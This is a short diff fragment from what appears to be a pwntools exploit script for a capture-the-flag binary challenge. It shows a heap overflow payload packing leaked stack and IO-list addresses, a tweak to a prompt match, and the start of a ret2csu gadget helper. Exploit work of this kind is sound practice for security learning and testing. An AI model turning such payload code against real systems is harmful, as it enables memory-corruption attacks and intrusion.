@@ -39,7 +39,8 @@ new("a" * 0x100 + p64(leak_stack - 0x549 + 8) + p64(0x61) + "p" * 8 +  p64(io_li
 # gdb.attach(p , "b *0x400B59")
 # pause()
 cmd(1)
-p.sendlineafter("index:\n", "0")
+# p.interactive()
+p.sendlineafter("index:", "0")
 
 def csu_init( addr_target_fuc_got , arg_1 , arg_2 , arg_3):
 	addr_init = 0x400C9A 
